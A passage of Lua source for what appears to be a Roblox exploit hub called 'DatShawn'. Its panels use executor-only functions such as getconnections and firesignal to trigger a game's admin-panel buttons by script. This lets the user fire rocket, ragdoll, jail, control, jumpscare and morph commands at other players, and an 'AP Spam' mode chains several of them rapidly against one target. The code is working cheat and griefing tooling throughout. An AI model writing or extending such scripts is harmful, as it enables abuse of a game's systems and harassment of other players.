	{Emoji = "🚀", Name = "rocket"},
	{Emoji = "🏃", Name = "ragdoll"},
	{Emoji = "🎈", Name = "balloon"},
}
local QuickCommandCooldowns = {
	rocket = 120, ragdoll = 30, balloon = 30, inverse = 60,
	jail = 60, control = 60, tiny = 60, jumpscare = 60, morph = 60,
}
local QuickLastCommandUse = {}
local QuickCommandButtons = {}

-- Animated swipe-style switch shared by every ON/OFF control in the hub.
paintSliderToggle = function(object, enabled, activeColor)
	if not object then return end
	object.Text = ""
	object.AutoButtonColor = false
	object.ClipsDescendants = true
	local corner = object:FindFirstChildOfClass("UICorner") or Instance.new("UICorner", object)
	corner.CornerRadius = UDim.new(1, 0)

	local knob = object:FindFirstChild("SliderKnob")
	if not knob then
		knob = Instance.new("TextLabel")
		knob.Name = "SliderKnob"
		knob.Size = UDim2.new(0, 20, 1, -6)
		knob.Position = UDim2.new(0, 3, 0, 3)
		knob.BackgroundColor3 = Color3.fromRGB(248, 250, 255)
		knob.Text = ""
		knob.TextColor3 = Color3.fromRGB(35, 120, 75)
		knob.TextSize = 11
		knob.Font = Enum.Font.FredokaOne
		knob.Active = false
		knob.ZIndex = object.ZIndex + 2
		knob.Parent = object
		Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
		local knobStroke = Instance.new("UIStroke", knob)
		knobStroke.Name = "KnobStroke"
		knobStroke.Color = Color3.fromRGB(215, 220, 232)
		knobStroke.Transparency = 0.25
		knobStroke.Thickness = 0.7
	end

	local status = object:FindFirstChild("SliderStatus")
	if not status then
		status = Instance.new("TextLabel")
		status.Name = "SliderStatus"
		status.Size = UDim2.new(1, -25, 1, 0)
		status.BackgroundTransparency = 1
		status.TextColor3 = Color3.fromRGB(245, 248, 255)
		status.TextSize = 8
		status.Font = Enum.Font.FredokaOne
		status.Active = false
		status.ZIndex = object.ZIndex + 1
		status.Parent = object
	end

	local trackColor = enabled and (activeColor or Color3.fromRGB(45, 180, 105)) or Color3.fromRGB(64, 68, 82)
	local knobPosition = enabled and UDim2.new(1, -23, 0, 3) or UDim2.new(0, 3, 0, 3)
	status.Text = enabled and "ON" or "OFF"
	status.Position = enabled and UDim2.new(0, 3, 0, 0) or UDim2.new(0, 22, 0, 0)
	status.TextXAlignment = enabled and Enum.TextXAlignment.Left or Enum.TextXAlignment.Right
	knob.Text = enabled and "✓" or ""
	knob.TextColor3 = enabled and Color3.fromRGB(35, 130, 78) or Color3.fromRGB(105, 110, 125)
	TweenService:Create(object, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {BackgroundColor3 = trackColor}):Play()
	TweenService:Create(knob, TweenInfo.new(0.26, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = knobPosition}):Play()
end

local function quickFireClick(guiButton)
	if not guiButton then return false end
	if typeof(getconnections) == "function" then
		for _, signal in ipairs({guiButton.Activated, guiButton.MouseButton1Click}) do
			local ok, connections = pcall(getconnections, signal)
			if ok then
				for _, connection in ipairs(connections) do
					if type(connection.Fire) == "function" then
						pcall(function() connection:Fire() end)
						return true
					elseif type(connection.Function) == "function" then
						pcall(connection.Function)
						return true
					end
				end
			end
		end
	end
	if typeof(firesignal) == "function" then
		pcall(firesignal, guiButton.MouseButton1Click)
		return true
	end
	return false
end

local function quickFindButton(root, wantedName)
	if not root then return nil end
	local direct = root:FindFirstChild(wantedName)
	if direct and direct:IsA("GuiButton") then return direct end
	for _, descendant in ipairs(root:GetDescendants()) do
		if descendant:IsA("GuiButton") and descendant.Name:lower() == wantedName:lower() then
			return descendant
		end
	end
end

local function quickFindPlayerButton(root, targetPlayer)
	if not root or not targetPlayer then return nil end
	for _, descendant in ipairs(root:GetDescendants()) do
		if descendant:IsA("GuiButton") then
			if descendant.Name == targetPlayer.Name then return descendant end
			local textObject = descendant:FindFirstChildWhichIsA("TextLabel", true)
			if textObject and (textObject.Text == targetPlayer.Name or textObject.Text == targetPlayer.DisplayName) then
				return descendant
			end
		end
	end
end

local function quickCooldownRemaining(commandName)
	local adminGui = PlayerGui:FindFirstChild("AdminPanel")
	local ok, scroll = pcall(function() return adminGui.AdminPanel.Content.ScrollingFrame end)
	local remoteRemaining = 0
	if ok and scroll then
		local commandButton = quickFindButton(scroll, commandName)
		local timer = commandButton and commandButton:FindFirstChild("Timer")
		if timer and timer.Visible then
			local timerText
			if timer:IsA("TextLabel") or timer:IsA("TextButton") or timer:IsA("TextBox") then
				timerText = timer.Text
			end
			if not timerText or timerText == "" then
				local nested = timer:FindFirstChildWhichIsA("TextLabel", true)
				timerText = nested and nested.Text or ""
			end
			local text = tostring(timerText)
			local minutes, seconds = text:match("(%d+):(%d+)")
			remoteRemaining = minutes and (tonumber(minutes) * 60 + tonumber(seconds))
				or tonumber(text:match("%d+")) or 1
		end
	end
	local usedAt = QuickLastCommandUse[commandName]
	local localRemaining = usedAt and math.max(0, (QuickCommandCooldowns[commandName] or 0) - (os.clock() - usedAt)) or 0
	return math.max(remoteRemaining, localRemaining)
end

Env.DatShawnCommandCooldownRemaining = quickCooldownRemaining
Env.DatShawnIsCommandOnCooldown = function(commandName)
	return quickCooldownRemaining(tostring(commandName):lower()) > 0
end

local function runQuickCommand(targetPlayer, commandName, silent)
	local adminGui = PlayerGui:FindFirstChild("AdminPanel") or PlayerGui:WaitForChild("AdminPanel", 3)
	if not adminGui then if not silent then notify("Admin Panel was not found", false) end; return false end
	local remaining = quickCooldownRemaining(commandName)
	if remaining > 0 then
		if not silent then notify(commandName:upper() .. " cooldown: " .. math.ceil(remaining) .. "s", false, Color3.fromRGB(190, 125, 35)) end
		return false
	end

	local _, commandScroll = pcall(function() return adminGui.AdminPanel.Content.ScrollingFrame end)
	local commandButton = quickFindButton(commandScroll, commandName) or quickFindButton(adminGui, commandName)
	if not commandButton or not quickFireClick(commandButton) then
		if not silent then notify(commandName:upper() .. " command unavailable", false) end
		return false
	end
	local _, profilesScroll = pcall(function() return adminGui.AdminPanel.Profiles.ScrollingFrame end)
	local playerButton = quickFindPlayerButton(profilesScroll, targetPlayer) or quickFindPlayerButton(adminGui, targetPlayer)
	if playerButton and quickFireClick(playerButton) then
		QuickLastCommandUse[commandName] = os.clock()
		if not silent then notify(commandName:upper() .. " → " .. targetPlayer.DisplayName, true) end
		return true
	else
		if not silent then notify("Player button unavailable", false) end
	end
	return false
end

QuickPanel = Instance.new("Frame")
QuickPanel.Name = ""
QuickPanel.Size = UDim2.fromOffset(388, 92)
QuickPanel.Position = Settings.QuickPanelPosition
QuickPanel.BackgroundColor3 = Color3.fromRGB(15, 13, 25)
QuickPanel.BackgroundTransparency = 0.08
QuickPanel.BorderSizePixel = 0
QuickPanel.Active = true
QuickPanel.Draggable = not Settings.GlobalGuiLocked
QuickPanel.ClipsDescendants = true
QuickPanel.Visible = State.QuickPanel
QuickPanel.Parent = GUI
Instance.new("UICorner", QuickPanel).CornerRadius = UDim.new(0, 12)
local quickStroke = Instance.new("UIStroke", QuickPanel)
quickStroke.Color = Color3.fromRGB(72, 130, 225)
quickStroke.Thickness = 1.6

connect(QuickPanel:GetPropertyChangedSignal("Position"), function()
	Settings.QuickPanelPosition = QuickPanel.Position
	queuePositionSave()
end)

local QuickTitle = Instance.new("TextLabel")
QuickTitle.Size = UDim2.fromOffset(150, 26)
QuickTitle.Position = UDim2.fromOffset(10, 1)
QuickTitle.BackgroundTransparency = 1
QuickTitle.Text = "QUICK PANEL"
QuickTitle.TextColor3 = Color3.fromRGB(245, 248, 255)
QuickTitle.TextSize = 15
QuickTitle.Font = Enum.Font.FredokaOne
QuickTitle.TextXAlignment = Enum.TextXAlignment.Left
QuickTitle.Parent = QuickPanel

CooldownPanel = Instance.new("Frame")
CooldownPanel.Name = "CommandCooldowns"
CooldownPanel.Size = UDim2.fromOffset(196, 286)
CooldownPanel.Position = Settings.CooldownPanelPosition
CooldownPanel.BackgroundColor3 = Color3.fromRGB(15, 18, 28)
CooldownPanel.BackgroundTransparency = 0.04
CooldownPanel.BorderSizePixel = 0
CooldownPanel.Active = true
CooldownPanel.Draggable = not Settings.GlobalGuiLocked
CooldownPanel.Visible = State.CooldownPanel
CooldownPanel.ZIndex = 120
CooldownPanel.Parent = GUI
Instance.new("UICorner", CooldownPanel).CornerRadius = UDim.new(0, 11)
local cooldownStroke = Instance.new("UIStroke", CooldownPanel)
cooldownStroke.Color = Color3.fromRGB(85, 120, 205)
cooldownStroke.Thickness = 1.3

local CooldownTitle = Instance.new("TextLabel")
CooldownTitle.Size = UDim2.new(1, -38, 0, 32)
CooldownTitle.Position = UDim2.fromOffset(10, 0)
CooldownTitle.BackgroundTransparency = 1
CooldownTitle.Text = "COMMAND COOLDOWNS"
CooldownTitle.TextColor3 = Color3.fromRGB(240, 244, 255)
CooldownTitle.TextSize = 11
CooldownTitle.Font = Enum.Font.FredokaOne
CooldownTitle.TextXAlignment = Enum.TextXAlignment.Left
CooldownTitle.ZIndex = 121
CooldownTitle.Parent = CooldownPanel


local CooldownBody = Instance.new("Frame")
CooldownBody.Size = UDim2.new(1, -12, 1, -38)
CooldownBody.Position = UDim2.fromOffset(6, 34)
CooldownBody.BackgroundTransparency = 1
CooldownBody.ZIndex = 121
CooldownBody.Parent = CooldownPanel
local cooldownLayout = Instance.new("UIListLayout", CooldownBody)
cooldownLayout.Padding = UDim.new(0, 2)
cooldownLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local CooldownCommands = {
	{Name = "rocket", Display = "Rocket"}, {Name = "ragdoll", Display = "Ragdoll"},
	{Name = "balloon", Display = "Balloon"}, {Name = "inverse", Display = "Inverse"},
	{Name = "jail", Display = "Jail"}, {Name = "control", Display = "Control"},
	{Name = "tiny", Display = "Tiny"}, {Name = "jumpscare", Display = "Jumpscare"},
	{Name = "morph", Display = "Morph"},
}
local CooldownRows = {}
for _, command in ipairs(CooldownCommands) do
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, 0, 0, 25)
	row.BackgroundColor3 = Color3.fromRGB(25, 29, 42)
	row.BorderSizePixel = 0
	row.ZIndex = 122
	row.Parent = CooldownBody
	Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6)
	local bar = Instance.new("Frame")
	bar.Size = UDim2.fromOffset(3, 17)
	bar.Position = UDim2.fromOffset(4, 4)
	bar.BackgroundColor3 = Color3.fromRGB(80, 200, 80)
	bar.BorderSizePixel = 0
	bar.ZIndex = 123
	bar.Parent = row
	Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -58, 1, 0)
	label.Position = UDim2.fromOffset(12, 0)
	label.BackgroundTransparency = 1
	label.Text = command.Display
	label.TextColor3 = Color3.fromRGB(232, 236, 248)
	label.TextSize = 10
	label.Font = Enum.Font.FredokaOne
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.ZIndex = 123
	label.Parent = row
	local status = Instance.new("TextLabel")
	status.Size = UDim2.fromOffset(48, 25)
	status.Position = UDim2.new(1, -53, 0, 0)
	status.BackgroundTransparency = 1
	status.Text = "READY"
	status.TextColor3 = Color3.fromRGB(80, 200, 80)
	status.TextSize = 9
	status.Font = Enum.Font.FredokaOne
	status.TextXAlignment = Enum.TextXAlignment.Right
	status.ZIndex = 123
	status.Parent = row
	CooldownRows[command.Name] = {Status = status, Bar = bar}
end

connect(CooldownPanel:GetPropertyChangedSignal("Position"), function()
	Settings.CooldownPanelPosition = CooldownPanel.Position
	queuePositionSave()
end)

task.spawn(function()
	while GUI.Parent do
		if CooldownPanel.Visible then
			for _, command in ipairs(CooldownCommands) do
				local row = CooldownRows[command.Name]
				local remaining = quickCooldownRemaining(command.Name)
				if remaining > 0 then
					row.Status.Text = tostring(math.ceil(remaining)) .. "s"
					row.Status.TextColor3 = Color3.fromRGB(255, 100, 100)
					row.Bar.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
				else
					row.Status.Text = "READY"
					row.Status.TextColor3 = Color3.fromRGB(80, 200, 80)
					row.Bar.BackgroundColor3 = Color3.fromRGB(80, 200, 80)
				end
			end
		end
		task.wait(0.25)
	end
end)

local QuickLine = Instance.new("Frame")
QuickLine.Size = UDim2.new(1, -24, 0, 2)
QuickLine.Position = UDim2.fromOffset(10, 27)
QuickLine.BackgroundColor3 = Color3.fromRGB(70, 135, 235)
QuickLine.BorderSizePixel = 0
QuickLine.Parent = QuickPanel

local QuickBody = Instance.new("ScrollingFrame")
QuickBody.Position = UDim2.fromOffset(8, 31)
QuickBody.Size = UDim2.new(1, -16, 1, -35)
QuickBody.BackgroundTransparency = 1
QuickBody.BorderSizePixel = 0
QuickBody.ScrollBarThickness = 4
QuickBody.ScrollBarImageColor3 = Color3.fromRGB(90, 155, 245)
QuickBody.AutomaticCanvasSize = Enum.AutomaticSize.Y
QuickBody.CanvasSize = UDim2.new()
QuickBody.Parent = QuickPanel
local QuickLayout = Instance.new("UIListLayout", QuickBody)
QuickLayout.Padding = UDim.new(0, 6)
QuickLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function rebuildQuickPanel()
	for _, child in ipairs(QuickBody:GetChildren()) do
		if child:IsA("Frame") or child:IsA("TextLabel") then child:Destroy() end
	end
	local count = 0
	QuickCommandButtons = {}
	for _, targetPlayer in ipairs(Players:GetPlayers()) do
		if targetPlayer ~= LP then
			count += 1
			local row = Instance.new("Frame")
			row.Name = targetPlayer.Name
			row.Size = UDim2.new(1, -4, 0, 50)
			row.LayoutOrder = count
			row.BackgroundColor3 = Color3.fromRGB(25, 21, 42)
			row.BorderSizePixel = 0
			row.Parent = QuickBody
			Instance.new("UICorner", row).CornerRadius = UDim.new(0, 9)

			local avatar = Instance.new("ImageLabel")
			avatar.Size = UDim2.fromOffset(36, 36)
			avatar.Position = UDim2.fromOffset(7, 7)
			avatar.BackgroundColor3 = Color3.fromRGB(8, 12, 22)
			avatar.BorderSizePixel = 0
			avatar.Image = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=48&h=48", targetPlayer.UserId)
			avatar.Parent = row
			Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

			local playerName = Instance.new("TextLabel")
			playerName.Size = UDim2.fromOffset(138, 40)
			playerName.Position = UDim2.fromOffset(50, 5)
			playerName.BackgroundTransparency = 1
			playerName.Text = targetPlayer.DisplayName .. "\n@" .. targetPlayer.Name
			playerName.TextColor3 = Color3.fromRGB(238, 242, 255)
			playerName.TextSize = 11
			playerName.Font = Enum.Font.FredokaOne
			playerName.TextXAlignment = Enum.TextXAlignment.Left
			playerName.TextTruncate = Enum.TextTruncate.AtEnd
			playerName.Parent = row

			local buttons = Instance.new("Frame")
			buttons.AnchorPoint = Vector2.new(1, 0.5)
			buttons.Position = UDim2.new(1, -7, 0.5, 0)
			buttons.Size = UDim2.fromOffset(160, 28)
			buttons.BackgroundTransparency = 1
			buttons.Parent = row
			local list = Instance.new("UIListLayout", buttons)
			list.FillDirection = Enum.FillDirection.Horizontal
			list.HorizontalAlignment = Enum.HorizontalAlignment.Right
			list.Padding = UDim.new(0, 5)

			for order, command in ipairs(QuickCommands) do
				local commandButton = Instance.new("TextButton")
				commandButton.Size = UDim2.fromOffset(28, 28)
				commandButton.LayoutOrder = order
				commandButton.BackgroundColor3 = Color3.fromRGB(50, 38, 78)
				commandButton.Text = command.Emoji
				commandButton.TextSize = 15
				commandButton.Font = Enum.Font.FredokaOne
				commandButton.AutoButtonColor = false
				commandButton.Parent = buttons
				Instance.new("UICorner", commandButton).CornerRadius = UDim.new(0, 6)
				table.insert(QuickCommandButtons, {Button = commandButton, Command = command.Name})
				connect(commandButton.MouseButton1Click, function()
					task.spawn(runQuickCommand, targetPlayer, command.Name)
				end)
			end
		end
	end
	if count == 0 then
		local empty = Instance.new("TextLabel")
		empty.Size = UDim2.new(1, 0, 0, 36)
		empty.BackgroundTransparency = 1
		empty.Text = "No other players"
		empty.TextColor3 = Color3.fromRGB(145, 155, 180)
		empty.TextSize = 12
		empty.Font = Enum.Font.FredokaOne
		empty.Parent = QuickBody
	end
	local visibleRows = math.min(math.max(count, 1), 8)
	QuickPanel.Size = UDim2.fromOffset(388, 35 + visibleRows * 50 + math.max(visibleRows - 1, 0) * 6)
end

connect(Players.PlayerAdded, function() task.wait(0.25); rebuildQuickPanel() end)
connect(Players.PlayerRemoving, function() task.wait(0.25); rebuildQuickPanel() end)
rebuildQuickPanel()

task.spawn(function()
	while GUI.Parent do
		for _, entry in ipairs(QuickCommandButtons) do
			if entry.Button and entry.Button.Parent then
				local coolingDown = quickCooldownRemaining(entry.Command) > 0
				entry.Button.BackgroundColor3 = coolingDown
					and Color3.fromRGB(205, 48, 58)
					or Color3.fromRGB(50, 38, 78)
			end
		end
		task.wait(0.3)
	end
end)

-- DatShawn AP SPAM uses the exact same command/player dispatcher as QUICK PANEL.
local APCommandOrder = {"balloon", "tiny", "rocket", "inverse", "ragdoll", "jail", "morph", "jumpscare"}
local APSelectedCommands = {
	Semi = {balloon = true, tiny = true, rocket = true, inverse = true, ragdoll = false, jail = false, morph = false, jumpscare = false},
	Full = {balloon = true, tiny = false, rocket = true, inverse = true, ragdoll = true, jail = true, morph = true, jumpscare = true},
}
if type(Settings.APSelectedCommands) == "table" then
	for mode, commands in pairs(Settings.APSelectedCommands) do
		if APSelectedCommands[mode] and type(commands) == "table" then
			for commandName, enabled in pairs(commands) do
				if APSelectedCommands[mode][commandName] ~= nil then APSelectedCommands[mode][commandName] = enabled == true end
			end
		end
	end
end
Settings.APSelectedCommands = APSelectedCommands
local APSpamBusy = {}
local APDispatchBusy = false

local function runAPSpam(targetPlayer, mode)
	if not targetPlayer or APSpamBusy[targetPlayer] then return end
	if APDispatchBusy then
		notify("AP batch already running", false, Color3.fromRGB(190, 125, 35))
		return
	end
	local commands = APSelectedCommands[mode]
	if not commands then return end
	APSpamBusy[targetPlayer] = true
	APDispatchBusy = true
	task.spawn(function()
		local used = 0
		for _, commandName in ipairs(APCommandOrder) do
			if commands[commandName] then
				local ok, fired = pcall(runQuickCommand, targetPlayer, commandName, true)
				if ok and fired then used += 1 end
				-- The Admin Panel uses one shared command/player selection state,
				-- so each pair still fully resolves before the next click (runQuickCommand's
				-- own 0.03s wait handles that). No extra idle gap here anymore, so commands
				-- fire back-to-back as fast as the panel allows.
			end
		end
		APSpamBusy[targetPlayer] = nil
		APDispatchBusy = false
		notify(string.format("AP %s → %s (%d)", mode:upper(), targetPlayer.DisplayName, used), used > 0,
			used > 0 and nil or Color3.fromRGB(190, 125, 35))
	end)
end

local function applyAPSnow(parent)
	task.spawn(function()
		while parent and parent.Parent do
			task.wait(0.12)
			local flake = Instance.new("TextLabel")
			flake.Size = UDim2.fromOffset(math.random(8, 14), math.random(8, 14))
			flake.Position = UDim2.new(math.random(), 0, -0.05, 0)
			flake.BackgroundTransparency = 1
			flake.Text = "*"
			flake.Font = Enum.Font.FredokaOne
			flake.TextScaled = true
			flake.TextColor3 = Color3.new(1, 1, 1)
			flake.TextTransparency = 0.3
			flake.ZIndex = parent.ZIndex + 1
			flake.Parent = parent
			local dx = flake.Position.X.Scale + math.random(-15, 15) / 100
			local tween = TweenService:Create(flake, TweenInfo.new(math.random(25, 40) / 10, Enum.EasingStyle.Linear), {
				Position = UDim2.new(dx, 0, 1.1, 0), TextTransparency = 0.8,
			})
			tween:Play()
			tween.Completed:Connect(function() flake:Destroy() end)
		end
	end)
end

APSpamPanel = Instance.new("Frame")
APSpamPanel.Name = "DatShawnAPSpam"
APSpamPanel.Size = UDim2.fromScale(0.18, 0.36)
APSpamPanel.Position = Settings.APSpamPosition
APSpamPanel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
APSpamPanel.BorderSizePixel = 0
APSpamPanel.Active = true
APSpamPanel.Draggable = not Settings.GlobalGuiLocked
APSpamPanel.ClipsDescendants = true
APSpamPanel.Visible = State.APSpam
APSpamPanel.Parent = GUI
APSpamPanel.ZIndex = 10
Instance.new("UICorner", APSpamPanel).CornerRadius = UDim.new(0, 24)
local apGradient = Instance.new("UIGradient", APSpamPanel)
apGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 25)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 45, 45)),
})
applyAPSnow(APSpamPanel)

connect(APSpamPanel:GetPropertyChangedSignal("Position"), function()
	Settings.APSpamPosition = APSpamPanel.Position
	queuePositionSave()
end)

local APTitle = Instance.new("TextLabel")
APTitle.Size = UDim2.new(1, 0, 0, 32)
APTitle.BackgroundTransparency = 1
APTitle.Text = "DatShawn's AP Spam"
APTitle.TextColor3 = Color3.fromRGB(240, 240, 240)
APTitle.TextScaled = true
APTitle.Font = Enum.Font.FredokaOne
APTitle.ZIndex = 15
APTitle.Parent = APSpamPanel

local APBody = Instance.new("ScrollingFrame")
APBody.Position = UDim2.fromOffset(8, 36)
APBody.Size = UDim2.new(1, -16, 1, -42)
APBody.BackgroundTransparency = 1
APBody.BorderSizePixel = 0
APBody.ScrollBarImageTransparency = 0.8
APBody.CanvasSize = UDim2.new()
APBody.ZIndex = 10
APBody.Parent = APSpamPanel
local APLayout = Instance.new("UIListLayout", APBody)
APLayout.Padding = UDim.new(0, 6)
APLayout.SortOrder = Enum.SortOrder.LayoutOrder
connect(APLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
	APBody.CanvasSize = UDim2.new(0, 0, 0, APLayout.AbsoluteContentSize.Y + 6)
end)

local function rebuildAPSpamPanel()
	for _, child in ipairs(APBody:GetChildren()) do
		if child:IsA("Frame") or child:IsA("TextLabel") then child:Destroy() end
	end
	local count = 0
	for _, targetPlayer in ipairs(Players:GetPlayers()) do
		if targetPlayer ~= LP then
			count += 1
			local row = Instance.new("Frame")
			row.Name = targetPlayer.Name
			row.Size = UDim2.new(1, 0, 0, 50)
			row.LayoutOrder = count
			row.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
			row.BorderSizePixel = 0
			row.ZIndex = 11
			row.Parent = APBody
			Instance.new("UICorner", row).CornerRadius = UDim.new(0, 16)

			local avatar = Instance.new("ImageLabel")
			avatar.Size = UDim2.fromOffset(32, 32)
			avatar.Position = UDim2.new(0, 8, 0.5, -16)
			avatar.BackgroundTransparency = 1
			avatar.ZIndex = 12
			pcall(function()
				avatar.Image = Players:GetUserThumbnailAsync(targetPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
			end)
			avatar.Parent = row
			Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

			local nameHolder = Instance.new("Frame")
			nameHolder.Size = UDim2.new(0.34, 0, 1, 0)
			nameHolder.Position = UDim2.new(0, 48, 0, 0)
			nameHolder.BackgroundTransparency = 1
			nameHolder.ZIndex = 12
			nameHolder.Parent = row

			local displayName = Instance.new("TextLabel")
			displayName.Size = UDim2.new(1, 0, 0.5, 0)
			displayName.BackgroundTransparency = 1
			displayName.Text = targetPlayer.DisplayName
			displayName.Font = Enum.Font.FredokaOne
			displayName.TextScaled = true
			displayName.TextXAlignment = Enum.TextXAlignment.Left
			displayName.TextColor3 = Color3.fromRGB(240, 240, 240)
			displayName.TextTruncate = Enum.TextTruncate.AtEnd
			displayName.ZIndex = 13
			displayName.Parent = nameHolder

			local username = Instance.new("TextLabel")
			username.Size = UDim2.new(1, 0, 0.5, 0)
			username.Position = UDim2.new(0, 0, 0.5, 0)
			username.BackgroundTransparency = 1
			username.Text = "(@" .. targetPlayer.Name .. ")"
			username.Font = Enum.Font.FredokaOne
			username.TextScaled = true
			username.TextXAlignment = Enum.TextXAlignment.Left
			username.TextColor3 = Color3.fromRGB(180, 180, 180)
			username.TextTruncate = Enum.TextTruncate.AtEnd
			username.ZIndex = 13
			username.Parent = nameHolder

			local semi = Instance.new("TextButton")
			semi.Size = UDim2.new(0.24, 0, 0.65, 0)
			semi.Position = UDim2.new(0.50, 0, 0.18, 0)
			semi.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
			semi.Text = "SEMI"
			semi.TextColor3 = Color3.new(1, 1, 1)
			semi.TextScaled = true
			semi.Font = Enum.Font.FredokaOne
			semi.ZIndex = 14
			semi.Parent = row
			Instance.new("UICorner", semi)

			local full = Instance.new("TextButton")
			full.Size = UDim2.new(0.24, 0, 0.65, 0)
			full.Position = UDim2.new(0.76, 0, 0.18, 0)
			full.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
			full.Text = "FULL"
			full.TextColor3 = Color3.new(1, 1, 1)
			full.TextScaled = true
			full.Font = Enum.Font.FredokaOne
			full.ZIndex = 14
			full.Parent = row
			Instance.new("UICorner", full)

			connect(semi.MouseButton1Click, function() runAPSpam(targetPlayer, "Semi") end)
			connect(full.MouseButton1Click, function() runAPSpam(targetPlayer, "Full") end)
		end
	end
	if count == 0 then
		local empty = Instance.new("TextLabel")
		empty.Size = UDim2.new(1, 0, 0, 36)
		empty.BackgroundTransparency = 1
		empty.Text = "No other players"
		empty.TextColor3 = Color3.fromRGB(155, 145, 170)
		empty.TextSize = 12
		empty.Font = Enum.Font.FredokaOne
		empty.Parent = APBody
	end
end

connect(Players.PlayerAdded, function() task.wait(0.25); rebuildAPSpamPanel() end)
connect(Players.PlayerRemoving, function() task.wait(0.25); rebuildAPSpamPanel() end)
rebuildAPSpamPanel()

APConfigFrame = Instance.new("Frame")
APConfigFrame.Name = "APCommandConfig"
APConfigFrame.Size = UDim2.fromOffset(230, 260)
APConfigFrame.Position = Settings.APConfigPosition
APConfigFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
APConfigFrame.BackgroundTransparency = 0.05
APConfigFrame.BorderSizePixel = 0
APConfigFrame.Active = true
APConfigFrame.Draggable = not Settings.GlobalGuiLocked
APConfigFrame.Visible = false
APConfigFrame.ZIndex = 80
APConfigFrame.Parent = GUI
Instance.new("UICorner", APConfigFrame).CornerRadius = UDim.new(0, 18)
local configStroke = Instance.new("UIStroke", APConfigFrame)
configStroke.Color = Color3.fromRGB(163, 163, 163)
configStroke.Thickness = 1
local configGradient = Instance.new("UIGradient", APConfigFrame)
configGradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 25)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 45, 45)),
})
applyAPSnow(APConfigFrame)

connect(APConfigFrame:GetPropertyChangedSignal("Position"), function()
	Settings.APConfigPosition = APConfigFrame.Position
	queuePositionSave()
end)

local ConfigTitle = Instance.new("TextLabel")
ConfigTitle.Size = UDim2.new(1, 0, 0, 25)
ConfigTitle.Position = UDim2.fromOffset(0, 3)
ConfigTitle.BackgroundTransparency = 1
ConfigTitle.Text = "Semi  |  CFG  |  Full"
ConfigTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
ConfigTitle.TextScaled = true
ConfigTitle.Font = Enum.Font.FredokaOne
ConfigTitle.ZIndex = 82
ConfigTitle.Parent = APConfigFrame

local SemiConfig = Instance.new("Frame")
SemiConfig.Size = UDim2.new(0.48, -4, 1, -34)
SemiConfig.Position = UDim2.fromOffset(4, 30)
SemiConfig.BackgroundTransparency = 1
SemiConfig.ZIndex = 82
SemiConfig.Parent = APConfigFrame
local SemiLayout = Instance.new("UIListLayout", SemiConfig)
SemiLayout.Padding = UDim.new(0, 3)
SemiLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local FullConfig = Instance.new("Frame")
FullConfig.Size = UDim2.new(0.48, -4, 1, -34)
FullConfig.Position = UDim2.new(0.52, 0, 0, 30)
FullConfig.BackgroundTransparency = 1
FullConfig.ZIndex = 82
FullConfig.Parent = APConfigFrame
local FullLayout = Instance.new("UIListLayout", FullConfig)
FullLayout.Padding = UDim.new(0, 3)
FullLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local APConfigRefreshers = {}
local function createAPConfigToggle(commandName, mode, parent)
	local configButton = Instance.new("TextButton")
	configButton.Size = UDim2.new(1, 0, 0, 26)
	configButton.BackgroundTransparency = 0.1
	configButton.Text = commandName:sub(1, 1):upper() .. commandName:sub(2)
	configButton.TextColor3 = Color3.new(1, 1, 1)
	configButton.TextSize = 13
	configButton.Font = Enum.Font.FredokaOne
	configButton.ZIndex = 83
	configButton.Parent = parent
	Instance.new("UICorner", configButton).CornerRadius = UDim.new(0, 7)
	local toggleStroke = Instance.new("UIStroke", configButton)
	toggleStroke.Color = Color3.fromRGB(160, 160, 160)
	toggleStroke.Thickness = 0.7

	local function refresh()
		local enabled = APSelectedCommands[mode][commandName] == true
		configButton.BackgroundColor3 = enabled
			and Color3.fromRGB(55, 185, 80)
			or Color3.fromRGB(200, 60, 60)
		configButton.TextColor3 = Color3.new(1, 1, 1)
		toggleStroke.Color = enabled
			and Color3.fromRGB(120, 255, 145)
			or Color3.fromRGB(255, 120, 120)
	end
	refresh()
	table.insert(APConfigRefreshers, refresh)
	connect(configButton.MouseButton1Click, function()
		APSelectedCommands[mode][commandName] = not APSelectedCommands[mode][commandName]
		Settings.APSelectedCommands = APSelectedCommands
		refresh()
		saveSettings()
	end)
end

for _, commandName in ipairs(APCommandOrder) do
	createAPConfigToggle(commandName, "Semi", SemiConfig)
	createAPConfigToggle(commandName, "Full", FullConfig)
end

APConfigBubble = Instance.new("TextButton")
APConfigBubble.Name = "DatShawnAPConfigBubble"
APConfigBubble.Size = UDim2.fromOffset(84, 30)
APConfigBubble.Position = Settings.APConfigBubblePosition
APConfigBubble.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
APConfigBubble.BackgroundTransparency = 0
APConfigBubble.AutoButtonColor = false
APConfigBubble.Font = Enum.Font.FredokaOne
APConfigBubble.Text = "DatShawn"
APConfigBubble.TextColor3 = Color3.new(1, 1, 1)
APConfigBubble.TextTransparency = 0
APConfigBubble.TextScaled = true
